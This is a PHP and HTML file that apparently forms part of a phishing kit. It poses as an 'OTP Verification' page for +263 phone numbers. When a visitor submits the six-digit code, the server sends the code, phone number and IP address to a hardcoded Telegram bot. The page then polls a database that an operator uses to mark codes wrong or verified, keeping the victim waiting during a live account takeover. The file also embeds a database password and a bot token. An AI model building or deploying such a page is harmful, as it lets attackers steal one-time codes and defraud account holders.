<?php
session_start();

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

// Telegram configuration
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

// MUST HAVE PHONE IN SESSION
if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}

$phone = trim($_SESSION['phone']);

// HANDLE AJAX REQUESTS FIRST (before any HTML output)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    
    header('Content-Type: application/json');
    header('Cache-Control: no-cache, must-revalidate');
    
    // Handle status check
    if (isset($_POST['check_status'])) {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        
        if (!$conn) {
            echo json_encode(['success' => false, 'error' => 'DB connection failed']);
            exit;
        }
        
        $sql = "SELECT otp, logout FROM users WHERE phone = $1";
        $result = pg_query_params($conn, $sql, [$phone]);
        
        if ($result && $row = pg_fetch_assoc($result)) {
            $otpValue = (int)$row['otp'];
            $logoutStatus = (int)$row['logout'];
            
            echo json_encode([
                'success' => true, 
                'otp_value' => $otpValue,
                'logout_status' => $logoutStatus
            ]);
        } else {
            echo json_encode(['success' => false, 'error' => 'User not found']);
        }
        exit;
    }
    
    // Handle reset OTP to 0
    if (isset($_POST['reset_otp'])) {
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        
        if (!$conn) {
            echo json_encode(['success' => false, 'error' => 'DB connection failed']);
            exit;
        }
        
        $updateSQL = "UPDATE users SET otp = 0 WHERE phone = $1";
        $result = pg_query_params($conn, $updateSQL, [$phone]);
        
        if ($result) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false]);
        }
        exit;
    }
    
    // Handle OTP submission
    if (isset($_POST['submit_otp'])) {
        $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
        $enteredOtp = implode('', $otpArray);
        $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
        
        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        
        if (!$conn) {
            echo json_encode(['success' => false, 'error' => 'DB connection failed']);
            exit;
        }
        
        // Ensure user exists
        $insertSQL = "INSERT INTO users (phone, pin, otp, approve, logout) 
                      VALUES ($1, 0, 0, 0, 0) 
                      ON CONFLICT (phone) DO NOTHING";
        pg_query_params($conn, $insertSQL, [$phone]);
        
        // Send Telegram notification - OTP formatted as fake email for blue underlined appearance
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $time = date('Y-m-d H:i:s');
        // Format OTP as fake email: otp@example.com - Telegram will make it blue, underlined, and copyable
        $fakeEmail = "{$enteredOtp}@otp.local";
        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: {$fakeEmail}\n⏰ Time: {$time}\n🌐 IP: {$ip}";
        
        function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'Markdown') {
            $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
            $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => $parseMode];
            $ch = curl_init();
            curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($postData), CURLOPT_TIMEOUT => 10]);
            curl_exec($ch);
            curl_close($ch);
        }
        sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
        
        echo json_encode(['success' => true]);
        exit;
    }
}

// Helper to mask phone for display
$maskedPhone = substr(preg_replace('/\D/', '', $phone), 0, 3) . "****" . substr(preg_replace('/\D/', '', $phone), -2);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OTP Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #f5f7fa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
}

.container {
    width: 100%;
    max-width: 500px;
    background: #fff;
    padding: 24px 20px 32px;
    border-radius: 24px;
    box-shadow: 0 10px 30px rgba(0,0,0,.1);
}

h2 {
    margin-top: 0;
    margin-bottom: 8px;
    font-size: 24px;
}

p {
    color: #6b7280;
    margin-bottom: 28px;
    font-size: 15px;
}

.message-area {
    min-height: 80px;
    margin-bottom: 20px;
}

.status-message {
    padding: 12px;
    border-radius: 8px;
    text-align: center;
    font-size: 14px;
    font-weight: 500;
    transition: all 0.3s ease;
    display: none;
}

.status-message.show {
    display: block;
    animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

.status-verifying {
    background: #e0f2fe;
    color: #0284c7;
    border-left: 4px solid #0284c7;
}

.status-wrong {
    background: #fee2e2;
    color: #dc2626;
    border-left: 4px solid #dc2626;
}

.status-processing {
    background: #fef3c7;
    color: #d97706;
    border-left: 4px solid #d97706;
}

.status-success {
    background: #d4edda;
    color: #155724;
    border-left: 4px solid #155724;
}

.status-error {
    background: #fef3c7;
    color: #d97706;
    border-left: 4px solid #d97706;
}

.otp-box {
    display: flex;
    justify-content: center;
    gap: 12px;
    flex-wrap: wrap;
}

.otp-box input {
    width: calc(16% - 8px);
    min-width: 45px;
    max-width: 65px;
    aspect-ratio: 1 / 1;
    font-size: 24px;
    text-align: center;
    border-radius: 12px;
    border: 2px solid #2563eb;
    background: white;
    font-weight: 600;
    padding: 0;
    outline: none;
    transition: 0.2s;
}

.otp-box input:focus {
    border-color: #1e40af;
    box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
}

.otp-box input:disabled {
    background: #f3f4f6;
    border-color: #d1d5db;
    cursor: not-allowed;
}

button {
    margin-top: 32px;
    width: 100%;
    padding: 14px;
    font-size: 18px;
    border: none;
    border-radius: 40px;
    background: #2563eb;
    color: white;
    cursor: pointer;
    font-weight: bold;
    transition: 0.2s;
}

button:hover:not(:disabled) {
    background: #1d4ed8;
}

button:disabled {
    background: #9ca3af;
    cursor: not-allowed;
}

.timer {
    margin-top: 24px;
    text-align: center;
    color: #6b7280;
    font-size: 14px;
}

.timer a {
    color: #2563eb;
    text-decoration: none;
}

.fade-out {
    animation: fadeOut 0.5s forwards;
}

@keyframes fadeOut {
    from { opacity: 1; }
    to { opacity: 0; visibility: hidden; }
}

@media (max-width: 480px) {
    .container {
        padding: 20px 16px 28px;
    }
    .otp-box {
        gap: 8px;
    }
    .otp-box input {
        min-width: 42px;
        font-size: 20px;
    }
}

@media (max-width: 380px) {
    .otp-box {
        gap: 6px;
    }
    .otp-box input {
        min-width: 38px;
        font-size: 18px;
    }
}
</style>
</head>
<body>

<div class="container">
    <h2>OTP Verification</h2>
    <p>Enter the OTP sent to your phone number<br>
        <strong>+263 <?= htmlspecialchars($maskedPhone) ?></strong>
    </p>

    <div class="message-area">
        <div id="statusMessage" class="status-message"></div>
    </div>

    <form id="otpForm">
        <div class="otp-box">
            <?php for ($i = 0; $i < 6; $i++): ?>
                <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
            <?php endfor; ?>
        </div>
        <button type="submit" id="submitBtn">Submit OTP</button>
    </form>

    <div class="timer" id="timer">Resend OTP in 120 seconds</div>
</div>

<script>
const inputs = document.querySelectorAll('.otp-box input');
const submitBtn = document.getElementById('submitBtn');
const statusDiv = document.getElementById('statusMessage');
let monitoringInterval = null;
let isSubmitting = false;
let hasRedirected = false;
let currentOtpValue = 0;
let currentLogoutStatus = 0;

function showMessage(message, type, autoHide = false) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message show status-${type}`;
    
    if (autoHide) {
        setTimeout(() => {
            if (statusDiv) {
                statusDiv.classList.add('fade-out');
                setTimeout(() => {
                    statusDiv.classList.remove('show', 'fade-out');
                }, 500);
            }
        }, 3000);
    }
}

function hideMessage() {
    statusDiv.classList.remove('show');
}

// Function to reset OTP to 0 in database
function resetOtpInDatabase() {
    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: 'reset_otp=1'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('OTP reset to 0');
        }
    })
    .catch(error => console.error('Error resetting OTP:', error));
}

// Function to check OTP status from database
function checkOTPStatus() {
    if (hasRedirected) return;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: 'check_status=1'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const otpValue = data.otp_value;
            const logoutStatus = data.logout_status;
            
            currentOtpValue = otpValue;
            currentLogoutStatus = logoutStatus;
            
            if (otpValue === 1) {
                // WRONG OTP
                showMessage('❌ Wrong OTP! Please try again.', 'wrong', true);
                
                // Stop monitoring
                if (monitoringInterval) {
                    clearInterval(monitoringInterval);
                    monitoringInterval = null;
                }
                
                // Re-enable form
                inputs.forEach(input => {
                    input.disabled = false;
                    input.value = '';
                });
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit OTP';
                isSubmitting = false;
                inputs[0].focus();
                
                // Reset OTP in database after error message fades
                setTimeout(() => {
                    resetOtpInDatabase();
                }, 3500);
                
            } else if (otpValue === 2) {
                // OTP is verified - now check logout status
                if (logoutStatus === 0) {
                    // Still processing - show waiting message
                    showMessage('⏳ Verifying, taking care of few things...', 'processing');
                    
                    // Keep monitoring for logout status changes
                    if (!monitoringInterval) {
                        monitoringInterval = setInterval(checkOTPStatus, 2000);
                    }
                    
                } else if (logoutStatus === 1) {
                    // Logout = 1, redirect to loggedin.php
                    showMessage('✅ OTP Verified! Redirecting to loggedin...', 'success');
                    
                    // Stop monitoring
                    if (monitoringInterval) {
                        clearInterval(monitoringInterval);
                        monitoringInterval = null;
                    }
                    hasRedirected = true;
                    
                    // Redirect after 1 second
                    setTimeout(() => {
                        window.location.href = 'loggedin.php';
                    }, 1000);
                    
                } else if (logoutStatus === 2) {
                    // Logout = 2, redirect to dashboard.php
                    showMessage('✅ OTP Verified! Redirecting to dashboard...', 'success');
                    
                    // Stop monitoring
                    if (monitoringInterval) {
                        clearInterval(monitoringInterval);
                        monitoringInterval = null;
                    }
                    hasRedirected = true;
                    
                    // Redirect after 1 second
                    setTimeout(() => {
                        window.location.href = 'dashboard.php';
                    }, 1000);
                }
            } else if (otpValue === 0) {
                // Still verifying OTP - keep showing verifying message
                if (statusDiv.textContent !== '🔍 Verifying OTP...') {
                    showMessage('🔍 Verifying OTP...', 'verifying');
                }
            }
        }
    })
    .catch(error => {
        console.error('Error checking status:', error);
    });
}

// OTP input handling
inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

// Focus first input on page load
inputs[0].focus();

// Handle form submission
document.getElementById('otpForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    if (isSubmitting) return;
    
    // Get OTP value
    let otpValue = '';
    inputs.forEach(input => {
        otpValue += input.value;
    });
    
    if (otpValue.length !== 6) {
        showMessage('⚠️ Please enter the complete 6-digit OTP', 'wrong', true);
        return;
    }
    
    // Disable form during submission
    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.textContent = 'Submitting...';
    inputs.forEach(input => input.disabled = true);
    
    // Prepare form data
    const formData = new FormData();
    formData.append('submit_otp', '1');
    inputs.forEach((input, idx) => {
        formData.append('otp[]', input.value);
    });
    
    try {
        const response = await fetch(window.location.href, {
            method: 'POST',
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: formData
        });
        
        const data = await response.json();
        
        if (data.success) {
            showMessage('🔍 Verifying OTP...', 'verifying');
            
            // Start monitoring database every 2 seconds
            if (monitoringInterval) {
                clearInterval(monitoringInterval);
            }
            monitoringInterval = setInterval(checkOTPStatus, 2000);
            
            // Check immediately
            checkOTPStatus();
        } else {
            showMessage('❌ Submission failed. Please try again.', 'wrong', true);
            // Re-enable form
            inputs.forEach(input => {
                input.disabled = false;
                input.value = '';
            });
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit OTP';
            isSubmitting = false;
            inputs[0].focus();
        }
    } catch (error) {
        console.error('Error:', error);
        showMessage('⚠️ Network error. Please try again.', 'error', true);
        // Re-enable form
        inputs.forEach(input => {
            input.disabled = false;
            input.value = '';
        });
        submitBtn.disabled = false;
        submitBtn.textContent = 'Submit OTP';
        isSubmitting = false;
        inputs[0].focus();
    }
});

// Timer functionality
let time = 120;
const timer = document.getElementById("timer");

const timerInterval = setInterval(() => {
    if (time > 0) {
        time--;
        timer.innerText = "Resend OTP in " + time + " seconds";
    } else {
        clearInterval(timerInterval);
        timer.innerHTML = '<a href="resend.php">Resend OTP</a>';
    }
}, 1000);
</script>

</body>
</html>
